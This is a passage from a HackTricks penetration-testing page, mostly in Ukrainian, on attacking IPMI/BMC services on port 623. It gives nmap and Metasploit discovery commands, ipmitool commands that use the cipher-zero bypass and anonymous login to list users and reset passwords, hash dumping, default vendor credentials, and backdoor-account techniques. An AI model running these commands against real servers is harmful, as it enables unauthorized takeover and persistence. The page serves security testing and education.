# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

### **–û–≥–ª—è–¥ IPMI**

**[–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –ø–ª–∞—Ç—Ñ–æ—Ä–º–æ—é (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** –ø—Ä–æ–ø–æ–Ω—É—î —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∏–∑–æ–≤–∞–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥ –¥–æ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Ç–∞ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –∫–æ–º–ø'—é—Ç–µ—Ä–Ω–∏—Ö —Å–∏—Å—Ç–µ–º, –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ –∞–±–æ —Å—Ç–∞–Ω—É –∂–∏–≤–ª–µ–Ω–Ω—è. –¶—è —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—è –¥–æ–∑–≤–æ–ª—è—î —Å–∏—Å—Ç–µ–º–Ω–∏–º –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º –≤—ñ–¥–¥–∞–ª–µ–Ω–æ –∫–µ—Ä—É–≤–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–∞–º–∏, –Ω–∞–≤—ñ—Ç—å –∫–æ–ª–∏ –≤–æ–Ω–∏ –≤–∏–º–∫–Ω–µ–Ω—ñ –∞–±–æ –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å, —ñ –æ—Å–æ–±–ª–∏–≤–æ –∫–æ—Ä–∏—Å–Ω–∞ –¥–ª—è:

- –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π –ø–µ—Ä–µ–¥ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º –û–°
- –£–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –≤–∏–º–∫–Ω–µ–Ω–Ω—è–º
- –í—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—ñ—Å–ª—è –∑–±–æ—ó–≤ —Å–∏—Å—Ç–µ–º–∏

IPMI –∑–¥–∞—Ç–µ–Ω –º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç–∏ —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∏, –Ω–∞–ø—Ä—É–≥–∏, —à–≤–∏–¥–∫–æ—Å—Ç—ñ –≤–µ–Ω—Ç–∏–ª—è—Ç–æ—Ä—ñ–≤ —Ç–∞ –±–ª–æ–∫–∏ –∂–∏–≤–ª–µ–Ω–Ω—è, –∞ —Ç–∞–∫–æ–∂ –Ω–∞–¥–∞–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —ñ–Ω–≤–µ–Ω—Ç–∞—Ä–∏–∑–∞—Ü—ñ—é, –ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ –∞–ø–∞—Ä–∞—Ç–Ω—ñ –∂—É—Ä–Ω–∞–ª–∏ —Ç–∞ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è —á–µ—Ä–µ–∑ SNMP. –î–ª—è –π–æ–≥–æ —Ä–æ–±–æ—Ç–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–∂–µ—Ä–µ–ª–æ –∂–∏–≤–ª–µ–Ω–Ω—è —Ç–∞ LAN-–∑'—î–¥–Ω–∞–Ω–Ω—è.

–ó –º–æ–º–µ–Ω—Ç—É —Å–≤–æ–≥–æ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∫–æ–º–ø–∞–Ω—ñ—î—é Intel —É 1998 —Ä–æ—Ü—ñ, IPMI –ø—ñ–¥—Ç—Ä–∏–º—É—î—Ç—å—Å—è —á–∏—Å–ª–µ–Ω–Ω–∏–º–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞–º–∏, —â–æ –ø–æ–∫—Ä–∞—â—É—î –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è, –æ—Å–æ–±–ª–∏–≤–æ –∑ –ø—ñ–¥—Ç—Ä–∏–º–∫–æ—é –≤–µ—Ä—Å—ñ—ó 2.0 –¥–ª—è —Å–µ—Ä—ñ–π–Ω–æ–≥–æ –∑'—î–¥–Ω–∞–Ω–Ω—è —á–µ—Ä–µ–∑ LAN. –ö–ª—é—á–æ–≤—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ –≤–∫–ª—é—á–∞—é—Ç—å:

- **–ö–æ–Ω—Ç—Ä–æ–ª–µ—Ä —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –º–∞—Ç–µ—Ä–∏–Ω—Å—å–∫–æ—é –ø–ª–∞—Ç–æ—é (BMC):** –û—Å–Ω–æ–≤–Ω–∏–π –º—ñ–∫—Ä–æ–∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä –¥–ª—è –æ–ø–µ—Ä–∞—Ü—ñ–π IPMI.
- **–ö–æ–º—É–Ω—ñ–∫–∞—Ü—ñ–π–Ω—ñ —à–∏–Ω–∏ —Ç–∞ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏:** –î–ª—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó —Ç–∞ –∑–æ–≤–Ω—ñ—à–Ω—å–æ—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó, –≤–∫–ª—é—á–∞—é—á–∏ ICMB, IPMB —Ç–∞ —Ä—ñ–∑–Ω—ñ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö —Ç–∞ –º–µ—Ä–µ–∂–µ–≤–∏—Ö –∑'—î–¥–Ω–∞–Ω—å.
- **–ü–∞–º'—è—Ç—å IPMI:** –î–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ —Ç–∞ –¥–∞–Ω–∏—Ö.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**: 623/UDP/TCP (–ó–∞–∑–≤–∏—á–∞–π –ø—Ä–∞—Ü—é—î –Ω–∞ UDP, –∞–ª–µ —Ç–∞–∫–æ–∂ –º–æ–∂–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –Ω–∞ TCP)

## –ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è

### –í–∏—è–≤–ª–µ–Ω–Ω—è
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
–í–∏ –º–æ–∂–µ—Ç–µ **–≤–∏—è–≤–∏—Ç–∏** **–≤–µ—Ä—Å—ñ—é** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ

–£ —Å—Ñ–µ—Ä—ñ IPMI 2.0 –∑–Ω–∞—á–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞ –î–∞–Ω–æ–º –§–∞—Ä–º–µ—Ä–æ–º, —â–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —á–µ—Ä–µ–∑ **cipher type 0**. –¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –¥–µ—Ç–∞–ª—å–Ω–æ –∑–∞–¥–æ–∫—É–º–µ–Ω—Ç–æ–≤–∞–Ω–∞ –≤ [–¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—ñ –î–∞–Ω–∞ –§–∞—Ä–º–µ—Ä–∞](http://fish2.com/ipmi/cipherzero.html), –¥–æ–∑–≤–æ–ª—è—î –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –∑ –±—É–¥—å-—è–∫–∏–º –ø–∞—Ä–æ–ª–µ–º, —è–∫—â–æ —Ü—ñ–ª—å–æ–≤–∏–º —î –¥—ñ–π—Å–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á. –¶—è —Å–ª–∞–±–∫—ñ—Å—Ç—å –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞ –≤ —Ä—ñ–∑–Ω–∏—Ö BMC –≤—ñ–¥ –≤–∏—Ä–æ–±–Ω–∏–∫—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ HP, Dell —Ç–∞ Supermicro, —â–æ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ –ø–æ—à–∏—Ä–µ–Ω—É –ø—Ä–æ–±–ª–µ–º—É –≤ —É—Å—ñ—Ö —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—è—Ö IPMI 2.0.

### **–û–±—Ö—ñ–¥ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó IPMI —á–µ—Ä–µ–∑ Cipher 0**

–©–æ–± –≤–∏—è–≤–∏—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –¥–æ–ø–æ–º—ñ–∂–Ω–∏–π —Å–∫–∞–Ω–µ—Ä Metasploit:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è —Ü—å–æ–≥–æ –Ω–µ–¥–æ–ª—ñ–∫—É –º–æ–∂–ª–∏–≤–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `ipmitool`, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂—á–µ, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ —Ç–∞ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –í—ñ–¥–¥–∞–ª–µ–Ω–µ –û—Ç—Ä–∏–º–∞–Ω–Ω—è –•–µ—à—ñ–≤ –ü–∞—Ä–æ–ª—ñ–≤**

–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –ø–æ—Å–æ–ª–µ–Ω—ñ —Ö–µ—à–æ–≤–∞–Ω—ñ –ø–∞—Ä–æ–ª—ñ (MD5 —Ç–∞ SHA1) –¥–ª—è –±—É–¥—å-—è–∫–æ–≥–æ —ñ—Å–Ω—É—é—á–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –©–æ–± –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, Metasploit –ø—Ä–æ–ø–æ–Ω—É—î –º–æ–¥—É–ª—å:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI –ê–Ω–æ–Ω—ñ–º–Ω–∞ –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è**

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —É –±–∞–≥–∞—Ç—å–æ—Ö BMC –¥–æ–∑–≤–æ–ª—è—î—Ç—å—Å—è "–∞–Ω–æ–Ω—ñ–º–Ω–∏–π" –¥–æ—Å—Ç—É–ø, —â–æ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏–∑—É—î—Ç—å—Å—è –ø–æ—Ä–æ–∂–Ω—ñ–º–∏ —Ä—è–¥–∫–∞–º–∏ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—è. –¶—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–ª—è —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤ —ñ–º–µ–Ω–æ–≤–∞–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `ipmitool`:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI –ü–∞—Ä–æ–ª—ñ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ**

–ö—Ä–∏—Ç–∏—á–Ω–∏–π –≤–∏–±—ñ—Ä –¥–∏–∑–∞–π–Ω—É –≤ IPMI 2.0 –≤–∏–º–∞–≥–∞—î –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ –≤ BMC –¥–ª—è —Ü—ñ–ª–µ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ó–±–µ—Ä—ñ–≥–∞–Ω–Ω—è —Ü–∏—Ö –ø–∞—Ä–æ–ª—ñ–≤ –∫–æ–º–ø–∞–Ω—ñ—î—é Supermicro –≤ —Ç–∞–∫–∏—Ö –º—ñ—Å—Ü—è—Ö, —è–∫ `/nv/PSBlock` –∞–±–æ `/nv/PSStore`, –≤–∏–∫–ª–∏–∫–∞—î –∑–Ω–∞—á–Ω—ñ –ø—Ä–æ–±–ª–µ–º–∏ –∑ –±–µ–∑–ø–µ–∫–æ—é:
```bash
cat /nv/PSBlock
```
### **–£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å Supermicro IPMI UPnP**

–í–∫–ª—é—á–µ–Ω–Ω—è Supermicro –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞—á–∞ UPnP SSDP —É —Å–≤–æ—î–º—É –ø—Ä–æ—à–∏–≤—Ü—ñ IPMI, –∑–æ–∫—Ä–µ–º–∞ –Ω–∞ UDP –ø–æ—Ä—Ç—É 1900, —Å—Ç–≤–æ—Ä—é—î —Å–µ—Ä–π–æ–∑–Ω–∏–π —Ä–∏–∑–∏–∫ –±–µ–∑–ø–µ–∫–∏. –£—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ Intel SDK –¥–ª—è UPnP Devices –≤–µ—Ä—Å—ñ—ó 1.3.1, —è–∫ –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å–∞–Ω–æ –≤ [—Ä–æ–∑–∫—Ä–∏—Ç—Ç—ñ Rapid7](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), –¥–æ–∑–≤–æ–ª—è—é—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ BMC –∑ –ø—Ä–∞–≤–∞–º–∏ root:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP –≤–∏–ø–∞–¥–∫–æ–≤–∏–º —á–∏–Ω–æ–º –≥–µ–Ω–µ—Ä—É—î —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π –ø–∞—Ä–æ–ª—å** –¥–ª—è —Å–≤–æ–≥–æ **Integrated Lights Out (iLO)** –ø—Ä–æ–¥—É–∫—Ç—É –ø—ñ–¥ —á–∞—Å –≤–∏—Ä–æ–±–Ω–∏—Ü—Ç–≤–∞. –¶—è –ø—Ä–∞–∫—Ç–∏–∫–∞ –∫–æ–Ω—Ç—Ä–∞—Å—Ç—É—î –∑ —ñ–Ω—à–∏–º–∏ –≤–∏—Ä–æ–±–Ω–∏–∫–∞–º–∏, —è–∫—ñ –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å **—Å—Ç–∞—Ç–∏—á–Ω—ñ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**. –ü—ñ–¥—Å—É–º–æ–∫ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏—Ö —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ–≤ –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö –ø—Ä–æ–¥—É–∫—Ç—ñ–≤ –Ω–∞–≤–µ–¥–µ–Ω–æ –Ω–∏–∂—á–µ:

- **HP Integrated Lights Out (iLO)** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **—Ñ–∞–±—Ä–∏—á–Ω–æ –≤–∏–ø–∞–¥–∫–æ–≤—É 8-—Å–∏–º–≤–æ–ª—å–Ω—É —Å—Ç—Ä–æ–∫—É** —è–∫ —Å–≤—ñ–π —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π –ø–∞—Ä–æ–ª—å, –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—á–∏ –≤–∏—â–∏–π —Ä—ñ–≤–µ–Ω—å –±–µ–∑–ø–µ–∫–∏.
- –ü—Ä–æ–¥—É–∫—Ç–∏, —Ç–∞–∫—ñ —è–∫ **iDRAC –≤—ñ–¥ Dell, IMM –≤—ñ–¥ IBM** —Ç–∞ **–Ü–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è Fujitsu**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –ª–µ–≥–∫–æ –≤–≥–∞–¥—É–≤–∞–Ω—ñ –ø–∞—Ä–æ–ª—ñ, —Ç–∞–∫—ñ —è–∫ "calvin", "PASSW0RD" (–∑ –Ω—É–ª–µ–º) —Ç–∞ "admin" –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ.
- –ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, **Supermicro IPMI (2.0), Oracle/Sun ILOM** —Ç–∞ **ASUS iKVM BMC** —Ç–∞–∫–æ–∂ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –ø—Ä–æ—Å—Ç—ñ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –∑ "ADMIN", "changeme" —Ç–∞ "admin" —è–∫ —ó—Ö –ø–∞—Ä–æ–ª—ñ.


## Accessing the Host via BMC

–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –ö–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –º–∞—Ç–µ—Ä–∏–Ω—Å—å–∫–æ—é –ø–ª–∞—Ç–æ—é (BMC) –≤—ñ–¥–∫—Ä–∏–≤–∞—î —Ä—ñ–∑–Ω—ñ —à–ª—è—Ö–∏ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ —Ö–æ—Å—Ç–∞. –ü—Ä–æ—Å—Ç–∏–π –ø—ñ–¥—Ö—ñ–¥ –ø–æ–ª—è–≥–∞—î –≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ KVM BMC. –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏, –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ —Ö–æ—Å—Ç –¥–æ –∫–æ—Ä–µ–Ω–µ–≤–æ–≥–æ –æ–±–æ–ª–æ–Ω–∫–∏ —á–µ—Ä–µ–∑ GRUB (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `init=/bin/sh`) –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏—Å—å –∑ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–æ–≥–æ CD-ROM, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ–≥–æ —è–∫ –¥–∏—Å–∫ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è. –¢–∞–∫—ñ –º–µ—Ç–æ–¥–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –¥–∏—Å–∫–æ–º —Ö–æ—Å—Ç–∞, –≤–∫–ª—é—á–∞—é—á–∏ –≤—Å—Ç–∞–≤–∫—É –±–µ–∫–¥–æ—Ä—ñ–≤, –≤–∏—Ç—è–≥ –¥–∞–Ω–∏—Ö –∞–±–æ –±—É–¥—å-—è–∫—ñ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥—ñ—ó –¥–ª—è –æ—Ü—ñ–Ω–∫–∏ –±–µ–∑–ø–µ–∫–∏. –û–¥–Ω–∞–∫ —Ü–µ –≤–∏–º–∞–≥–∞—î –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ö–æ—Å—Ç–∞, —â–æ —î –∑–Ω–∞—á–Ω–∏–º –Ω–µ–¥–æ–ª—ñ–∫–æ–º. –ë–µ–∑ –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø –¥–æ –ø—Ä–∞—Ü—é—é—á–æ–≥–æ —Ö–æ—Å—Ç–∞ —î –±—ñ–ª—å—à —Å–∫–ª–∞–¥–Ω–∏–º —ñ –≤–∞—Ä—ñ—é—î—Ç—å—Å—è –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ö–æ—Å—Ç–∞. –Ø–∫—â–æ —Ñ—ñ–∑–∏—á–Ω–∞ –∞–±–æ —Å–µ—Ä—ñ–π–Ω–∞ –∫–æ–Ω—Å–æ–ª—ñ —Ö–æ—Å—Ç–∞ –∑–∞–ª–∏—à–∞—é—Ç—å—Å—è —É–≤—ñ–π–¥–µ–Ω–∏–º–∏, —ó—Ö –º–æ–∂–Ω–∞ –ª–µ–≥–∫–æ –∑–∞—Ö–æ–ø–∏—Ç–∏ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å KVM –∞–±–æ serial-over-LAN (sol) BMC –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `ipmitool`. –î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Å–ø—ñ–ª—å–Ω–∏—Ö –∞–ø–∞—Ä–∞—Ç–Ω–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ —à–∏–Ω–∞ i2c —Ç–∞ Super I/O —á–∏–ø, —î –æ–±–ª–∞—Å—Ç—é, —â–æ –ø–æ—Ç—Ä–µ–±—É—î –ø–æ–¥–∞–ª—å—à–æ–≥–æ –≤–∏–≤—á–µ–Ω–Ω—è.

## Introducing Backdoors into BMC from the Host

–ü—ñ—Å–ª—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó —Ö–æ—Å—Ç–∞, –æ—Å–Ω–∞—â–µ–Ω–æ–≥–æ BMC, **–ª–æ–∫–∞–ª—å–Ω–∏–π —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å BMC –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≤—Å—Ç–∞–≤–∫–∏ –±–µ–∫–¥–æ—Ä-–æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É**, —Å—Ç–≤–æ—Ä—é—é—á–∏ —Ç—Ä–∏–≤–∞–ª—É –ø—Ä–∏—Å—É—Ç–Ω—ñ—Å—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ. –¶—è –∞—Ç–∞–∫–∞ –≤–∏–º–∞–≥–∞—î –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ **`ipmitool`** –Ω–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–º—É —Ö–æ—Å—Ç—ñ —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –¥—Ä–∞–π–≤–µ—Ä–∞ BMC. –ù–∞—Å—Ç—É–ø–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ —ñ–ª—é—Å—Ç—Ä—É—é—Ç—å, —è–∫ –Ω–æ–≤–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –º–æ–∂–µ –±—É—Ç–∏ –≤—Å—Ç–∞–≤–ª–µ–Ω–∏–π —É BMC, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ª–æ–∫–∞–ª—å–Ω–∏–π —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å —Ö–æ—Å—Ç–∞, —â–æ –æ–±—Ö–æ–¥–∏—Ç—å –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –∑–∞—Å—Ç–æ—Å–æ–≤–Ω–∞ –¥–æ —à–∏—Ä–æ–∫–æ–≥–æ —Å–ø–µ–∫—Ç—Ä—É –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–∏—Ö 